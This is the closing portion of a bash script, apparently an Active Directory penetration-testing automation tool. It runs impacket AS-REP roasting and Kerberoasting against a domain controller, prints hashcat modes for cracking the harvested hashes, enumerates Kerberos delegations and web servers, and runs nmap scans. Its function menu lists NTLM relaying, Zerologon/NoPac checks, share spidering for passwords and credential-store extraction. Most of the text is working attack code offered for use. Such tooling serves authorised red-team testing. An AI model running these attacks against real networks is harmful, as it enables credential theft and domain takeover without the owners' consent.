			${proxychains} impacket-GetNPUsers -dc-ip $DC_ip -no-pass -request -usersfile ${ROOT_PATH}/users.txt $domain/ -outputfile ${DIR_VULNS}/krb/asreproasting_Users.txt > /dev/null 2>&1
		fi
		if grep -q 'asrep' "${DIR_VULNS}/krb/asreproasting_Users.txt"; then
			green_log "${SPACE}[💀] Great, there are asreproastable accounts found -> ${DIR_VULNS}/krb/asreproasting_Users.txt"
			blue_log "${SPACE} [+] Use hashcat -m 18200 ... to bang them passwords"
		elif grep -q 'KDC_ERR_KEY_EXPIRED' "${DIR_VULNS}/krb/asreproasting_Users.txt"; then
			green_log "${SPACE}[💀] Found asreproastable accounts BUT all have expired passwords -> ${DIR_VULNS}/krb/asreproasting_Users.txt"
		fi
	fi
}

krb () {
	if [[ -e "${DIR_PORTS}/88.txt" ]]; then
		DC_ip=$(cat "${DIR_PORTS}/88.txt" | head -n 1)
		hostname=$(grep -E "^$DC_ip:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
		#DC_host="$(echo ${hostname} | cut -d '.' -f 1)"
		DC_host="${hostname}"
		domain=$(echo "${hostname}" | cut -d '.' -f 2-)
		mkdir ${DIR_VULNS}/krb  2>/dev/null
		log "[🔍] Checking SPN users (kerberoast) ..."
		if [[ "${Username}" != "anonymous" ]]; then
			if [ -n "$NT_Hash" ]; then
				${proxychains} impacket-getTGT -hashes ":${NT_Hash}" $domain/${Username} -dc-ip ${DC_host} > /dev/null 2>&1
			else
				${proxychains} impacket-getTGT $domain/${Username}:${Password} -dc-ip ${DC_host} > /dev/null > /dev/null 2>&1
			fi
		fi
		if [[ -e "${Username}.ccache" ]]; then
			export KRB5CCNAME=${Username}.ccache
			rm ${DIR_VULNS}/krb/Kerberoasting_SPN_Users.txt
			${proxychains} impacket-GetUserSPNs $domain/${Username} -no-pass -k -request -dc-host ${DC_host} > ${DIR_VULNS}/krb/Kerberoasting_SPN_Users.txt
		else
			if [[ -e "${DIR_VULNS}/krb/asreproasting_Users.txt" ]];then
				while IFS= read -r line; do
					asp_user=$(echo "$line" |awk -F'$' '{print $4}' |awk -F'@' '{print $1}')
					${proxychains} impacket-GetUserSPNs -no-preauth $asp_user -usersfile ${ROOT_PATH}/users.txt -dc-host ${DC_host} -request $domain/ > ${DIR_VULNS}/krb/Kerberoasting_SPN_Users_preauth.txt
				done < "${DIR_VULNS}/krb/asreproasting_Users.txt"
    				grep -s "krb5tgs" ${DIR_VULNS}/krb/Kerberoasting_SPN_Users_preauth.txt >> ${DIR_VULNS}/krb/Kerberoasting_SPN_Users.txt
			fi
		fi

		if [ -e "${DIR_VULNS}/krb/Kerberoasting_SPN_Users.txt" ] && ! grep -qs 'No entries' "${DIR_VULNS}/krb/Kerberoasting_SPN_Users.txt"; then
			green_log "${SPACE}[💀] Great, kerberoastable accounts found -> ${DIR_VULNS}/krb/Kerberoasting_SPN_Users.txt"
			blue_log "${SPACE} [+] Use hashcat -m 13100 ... to bang them passwords"
		fi
		
		#delegation
		log "[🔍] Searching delegations .."
		if [[ -e "${Username}.ccache" ]]; then
			export KRB5CCNAME=${Username}.ccache
			${proxychains} impacket-findDelegation $domain/${Username} -no-pass -k -dc-host ${DC_host} > ${DIR_VULNS}/krb/Delegations.txt
			unset KRB5CCNAME
			rm ${Username}.ccache
		fi
		if grep -qs 'AccountName' ${DIR_VULNS}/krb/Delegations.txt;then
			echo $delegation_request >> ${DIR_VULNS}/Vulns_delegation.txt;
			green_log "[💀] Delegations found -> ${DIR_VULNS}/krb/Delegations.txt"
		fi
	fi
}


web () {
	# Parcourir le fichier Nmap
	log "[🔍] Checking Web Servers ..."
	while IFS= read -r line; do
		if [[ $line == "Nmap scan report for"* ]]; then
			# Extraire l'adresse IP
			ip=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
			hostname=$(grep -E "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
		elif [[ $line =~ ^([0-9]+)/tcp ]]; then
			port="${BASH_REMATCH[1]}"
   			if control_ip_attack; then
				# Extract port number and protocol
				if [[ "$line" =~ http|https ]] && [[ ! "$line" =~ ncacn_http ]] && [[ "$port" != "5985" && "$port" != "5986" && "$port" != "5357" ]]; then
					echo $line
					whatweb ${ip}:${port} --log-brief=/tmp/whatweb >/dev/null 2>&1
					HTTPServer=$(cat /tmp/whatweb | grep -oP 'HTTPServer\[\K[^\]]+')
					Title=$(cat /tmp/whatweb | grep -oP 'Title\[\K[^\]]+' || echo "No title identified")
					green_log "${SPACE}${ip}:${port} (${hostname}) -> ${HTTPServer} /// ${Title}"
				  	rm /tmp/whatweb
				fi
				# Ajouter l'IP à son fichier correspondant
				#echo "${ip}" >> "${DIR_PORTS}/${port}.txt"
			fi
		fi
	done < "${ROOT_PATH}/scan_nmap/scan_Fast_TCP.nmap"
}

nmap_full () {
	
	PORTS_FOUND=$(ls ${DIR_PORTS}/*.txt | xargs -n 1 basename | sed 's/\.txt$//' | paste -sd ",")
	log "[🔍] Scanning NMAP - Full version"
	
	if [ -n "${proxychains}" ]; then
		#Proxychains ne comprenant pas les requetes personnalisé, nous lui indiqueront de faire des requetes full (sT)
		#${proxychains} nmap -Pn -A -sT -sCV -iL ${ROOT_PATH}/hosts.txt -oA ${ROOT_PATH}/scan_nmap/scan_Full_TCP -p${PORTS_FOUND} --open >/dev/null 2>&1
		if [ -e ${ROOT_PATH}/scan_nmap/scan_Fast_TCP.nmap ];then
			cp ${ROOT_PATH}/scan_nmap/scan_Fast_TCP.nmap ${ROOT_PATH}/scan_nmap/scan_Full_TCP.nmap
			cp ${ROOT_PATH}/scan_nmap/scan_Fast_TCP.xml ${ROOT_PATH}/scan_nmap/scan_Full_TCP.xml
		else
			blue_log "Do a more in depth nmap on the distant internal network to continue :"
			blue_log "nmap -Pn -A -sT -sCV $rangeIP -oA scan_Full_TCP -p- --open"
			blue_log "Then exfiltrate nmap reports to '${ROOT_PATH}/scan_nmap/' on the attacker's machine"
			log "Press Entrer when ready ..."
			read
			nmap_full
		fi
	else
		nmap -sT -Pn -A -sCV -T4 -iL ${ROOT_PATH}/hosts.txt -oA ${ROOT_PATH}/scan_nmap/scan_Full_TCP -p${PORTS_FOUND} --open >/dev/null 2>&1
		
	fi
	
	#Deleting useless files
	if [ -n "$(ls ${ROOT_PATH}/scan_nmap/*.gnmap 2>/dev/null)" ]; then
		rm ${ROOT_PATH}/scan_nmap/*.gnmap
	fi
	
	xsltproc ${ROOT_PATH}/scan_nmap/scan_Full_TCP.xml -o ${ROOT_PATH}/scan_Full_TCP.html
	
	log "${SPACE}File TCP in HTML format available to -> ${ROOT_PATH}/scan_Full_TCP.html"
	log "${SPACE}File UDP in HTML format available to -> ${ROOT_PATH}/scan_Full_UDP_open.html"
}

########################### TREE COMMAND ##################################
say_bye () {
	echo "⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐" >> $logfile
	echo "$(tree ${ROOT_PATH})"
	echo "$(tree ${ROOT_PATH})" >> $logfile
	echo "⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐" >> $logfile
	log "Elapsed Time: $(python3 -c "import datetime;print(str(datetime.timedelta(seconds=$(( SECONDS - start )))))")"
	log "Good Bye !!"
	exit
}


# Déclaration des fonctions
declare -a functions=(nmap_fast relay manspider vulns ftp ssh winrm rdp smtp nfs vnc zt printers snmp ldap ipmi mssql smb bloodhound users asp krb web nmap_full)
declare -a functions_long_names=("Scan open ports and service versions (need to be done at least 1 time at the begin of a project)" "Launch Responder and NTLMRelayx" "Search for sensitive data (passwords, usernames...) on SMB shares" "Check for ms17-010, NoPac, Zerologon, MSOL creds, GPP_autologin, GPP_password, ..." "Enumerate FTP services" "Enumerate SSH services" "Enumerate WinRM services" "Enumerate WinRM services" "Enumerate SMTP services" "Enumerate NFS shares" "Enumerate VNC services" "Attempt DNS zone transfers" "Identify reachable printers" "Search for public SNMP communities" "Anonymous LDAP enumeration" "IPMI service enumeration" "Attempt MSSQL authentication" "Check anonymous/guest access, shares, users, LSA, DPAPI, ..." "Collect data for BloodHound Community Edition (equivalent to SharpHound/Ingestor)" "Enumerate Active Directory users (Get-ADUsers)" "Attempt AS-REP Roasting attack" "Attempt Kerberoasting attack" "Identify web services" "Deep Nmap scan")
###################		 HELP 	##############################
Help() {
    echo "Usage: $0 -o ProjectName -i Interface -t rangeIP [-u Username [-p Password | -n NT_Hash]] [-f | -e nmap_fast | -s smb,vnc] [-m [basic | no-ping]]"
    echo
    echo "Options:"
    echo "  -o  Project name (output directory)"
    echo "  -i  Network interface"
    echo "  -t  IP range (e.g., 192.168.0.0/24,192.168.1.128/27). /32 must be used for individual IP addresses."
    echo "  -u  Username (optional)"
    echo "  -p  Password (optional, either Password or NT_Hash must be provided, can be empty)"
    echo "  -H  NTLM Hash (optional, either Password or NT_Hash must be provided, can be empty)"
    echo "  -f  Execute all functions"
    echo "  -e  Execute all functions except specified ones (-e rdp,winrm)"
    echo "  -s  Execute only specified functions (-s rdp,winrm)"
    echo "  -m  Discovery mode (default: basic). basic = ARP + ping (faster, may miss hosts); no-ping = skip ping (slower, more accurate)"
	echo "  -M  Modifications or alerts on target systems may be performed (e.g., SAM / LSA / LSASS / DPAPI / NTDS extraction, RDP enabling)"
    echo "  -r  Restore modifications made to targets"
    echo "  -h  Display help"
    echo
    echo "Available functions:"
    for i in "${!functions[@]}"; do
        printf "  - %-12s : %s\n" "${functions[$i]}" "${functions_long_names[$i]}"
    done
    exit 1
}

while getopts "o:i:u:p:H:t:e:s:m:fhMr" option; do
    case $option in
        o) ProjectName=$OPTARG;;
        i) INTERFACE=$OPTARG;;
        u) Username=$OPTARG;;
        p) Password=$OPTARG;;
        H) NT_Hash=$OPTARG;;
        t) rangeIP=$OPTARG;;
        f) execute_all=true;;
        e) excluded_funcs=$OPTARG;;
        s) selected_funcs=$OPTARG;;
		m) discovery_mode=$OPTARG;;
		M) soft=false;;
        r) restore=true;;
        h) Help;;
        \?) echo "Erreur : Option invalide"; Help;;
    esac
done

# Check mandatory parameters
if [[ -z "$ProjectName" || -z "$INTERFACE" || -z "$rangeIP" ]]; then
    echo "Error :All mandatory parameters have to be set."
    Help
    exit 1
fi

# Check Password / NT_Hash
if [[ -n "${Password}" && -n "$NT_Hash" ]]; then
    echo "Error : You can't set Password and NTLMHash in the same time."
    exit 1
fi

#If discovery_mode is not defined
if [[ -z "$discovery_mode" || "$discovery_mode" == "basic" ]]; then
    discovery_mode="arp-ping"
elif [[ "$discovery_mode" != "no-ping" ]]; then
    echo "Error : discovery_mode must be 'basic' or 'no-ping'."
    exit 1
fi

# Execute all functions
if [[ $execute_all ]]; then
    domain=""
	starter
    for f in ${functions[@]}; do 
        $f
    done 
    say_bye
fi

# Execute specific functions
if [[ -n "$selected_funcs" ]]; then
    starter
    IFS=',' read -ra selected_funcs_arr <<< "$selected_funcs"
    for f in ${functions[@]}; do 
        for s in "${selected_funcs_arr[@]}"; do
            if [ "$s" == "$f" ];then
                $s
            fi
        done
    done
    say_bye
fi

# Exclude some functions
if [[ -n "$excluded_funcs" ]]; then
    starter
    IFS=',' read -ra excluded_funcs_arr <<< "$excluded_funcs"
    for f in "${functions[@]}"; do
        if [[ ! " ${excluded_funcs_arr[@]} " =~ " ${f} " ]]; then
            $f
        fi
    done
    say_bye
fi

# Restore modifications
if [[ $restore ]]; then
	DIR=$ProjectName
    while IFS= read -r command; do
        eval $command
    done < "${ROOT_PATH}/modifs_automation.txt"
    exit
fi
